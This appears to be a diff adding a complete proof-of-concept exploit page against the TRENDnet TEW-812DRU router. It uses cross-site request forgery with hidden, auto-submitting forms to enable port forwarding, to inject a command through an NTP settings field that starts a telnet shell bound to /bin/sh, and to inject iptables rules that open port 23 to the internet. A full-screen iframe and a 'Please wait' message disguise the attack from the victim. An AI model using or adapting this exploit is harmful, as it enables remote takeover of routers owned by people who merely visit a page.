@@ -1,0 +1,125 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt; TRENDnet TEW-812DRU CSRF - Command Injection &gt; Shell Exploit.&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;img src=&quot;http://www.example.com/Images/logo.gif&quot;&gt;&lt;!--TRENDnet Logo for attack launch page --&gt;
+&lt;h1&gt;Please wait... &lt;/h1&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+//Request to enable port forwarding to the routers internal IP on port 23
+//This exploit works without this request, but the exploit was more stable with it, so its included in thos PoC.
+function RF1(){
+    document.write(&#039;&lt;form name=&quot;portfwd&quot; target =&quot;_blank&quot; action=&quot;http://www.example.com/uapply.cgi&quot; method=&quot;post&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;page&quot; value=&quot;/advanced/single_port.asp&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port_enable&quot; value=&quot;0&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port&quot; value=&quot;24&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port_proto0&quot; value=&quot;tcp&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port_from_start0&quot; value=&quot;23&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port_from_end0&quot; value=&quot;23&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port_to_ip0&quot; value=&quot;www.example.com&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port_to_start0&quot; value=&quot;23&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port_to_end0&quot; value=&quot;23&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;schedule0&quot; value=&quot;0&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;forward_port_enable0&quot; value=&quot;on&quot;&gt;&#039;+
+    &#039;&lt;input tpye=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Apply&quot;&gt;&#039;+
+    &#039;&lt;/form&gt;&#039;);
+}
+ 
+//Request to enable telnet
+function RF2(){
+    document.write(&#039;&lt;form name=&quot;enable23&quot; target=&quot;_blank&quot; action=&quot;http://www.example.com/setNTP.cgi&quot; method=&quot;post&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;page&quot; value=&quot;/adm/time.asp&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;DSTenable&quot; value=&quot;on&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NtpDstEnable&quot; value=&quot;1&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NtpDstOffset&quot; value=&quot;`utelnetd -l /bin/sh`&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NtpDstStart&quot; value=&quot;030102&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_start_month_select&quot; value=&quot;03&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_start_day_select&quot; value=&quot;01&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_start_time_select&quot; value=&quot;02&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NtpDstEnd&quot; value=&quot;100102&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_end_month_select&quot; value=&quot;10&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_end_day_select&quot; value=&quot;01&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_end_time_select&quot; value=&quot;02&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;ntp_server&quot; value=&quot;1&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NTPServerIP&quot; value=&quot;pool.ntp.org&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;time_zone&quot; value=&quot;UCT_-11&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;timer_interval&quot; value=&quot;300&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_year_select&quot; value=&quot;2012&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_month_select&quot; value=&quot;01&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_day_select&quot; value=&quot;01&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_hour_select&quot; value=&quot;00&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_min_select&quot; value=&quot;19&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_sec_select&quot; value=&quot;57&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;timeTag&quot; value=&quot;manual&quot;&gt;&#039;+
+    &#039;&lt;/form&gt;&#039;);
+}
+ 
+//Request to change iptables to allow port 23 from the WAN.
+function RF3(){
+    document.write(
+    &#039;&lt;form name=&quot;ipTableRule&quot; target=&quot;_blank&quot; action=&quot;http://www.example.com/setNTP.cgi&quot; method=&quot;post&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;page&quot; value=&quot;/adm/time.asp&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;DSTenable&quot; value=&quot;on&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NtpDstEnable&quot; value=&quot;1&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NtpDstOffset&quot; value=&quot;3600&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NtpDstStart&quot; value=&quot;030102&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_start_month_select&quot; value=&quot;03&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_start_day_select&quot; value=&quot;01&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_start_time_select&quot; value=&quot;02&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NtpDstEnd&quot; value=&quot;`count=0;while [ $count -le 25 ]; do iptables -I INPUT 1 -p tcp --dport 23 -j ACCEPT;(( count++ ));done;`&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_end_month_select&quot; value=&quot;10&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_end_day_select&quot; value=&quot;01&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;tz_daylight_end_time_select&quot; value=&quot;02&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;ntp_server&quot; value=&quot;1&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;NTPServerIP&quot; value=&quot;pool.ntp.org&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;time_zone&quot; value=&quot;UCT_-11&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;timer_interval&quot; value=&quot;300&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_year_select&quot; value=&quot;2012&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_month_select&quot; value=&quot;01&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_day_select&quot; value=&quot;01&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_hour_select&quot; value=&quot;00&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_min_select&quot; value=&quot;19&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;manual_sec_select&quot; value=&quot;57&quot;&gt;&#039;+
+    &#039;&lt;input type=&quot;hidden&quot; name=&quot;timeTag&quot; value=&quot;manual&quot;&gt;&#039;+
+    &#039;&lt;/form&gt;&#039;);
+}
+ 
+function createPage(){
+    RF1();
+    RF2();
+    RF3();
+    document.write(&#039;&lt;iframe src=&quot;http://www.example.com/&quot; target=&quot;_blank&quot; width=&quot;100%&quot; height=&quot;100%&quot; frameborder=&quot;0&quot; style=&quot;border: 0; position:fixed; top:0; left:0; right:0; bottom:0;&quot;&gt;&lt;/iframe&gt;&#039;);
+}
+ 
+function _portfwd(){
+    document.portfwd.submit();
+}
+ 
+function _enable23(){
+    document.enable23.submit();
+}
+ 
+function _ipTableRule(){
+    document.ipTableRule.submit();i
+}
+ 
+//Called Functions
+createPage()
+     
+for(var i = 0; i &lt; 3; i++){
+    if(i == 0){
+        window.setTimeout(_portfwd, 1000);
+    }
+    else if(i == 1){
+        window.setTimeout(_enable23, 2000);
+    }
+    else if(i == 2){
+        window.setTimeout(_ipTableRule, 4000);
+    }
+    else{
+        continue;
+    }
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
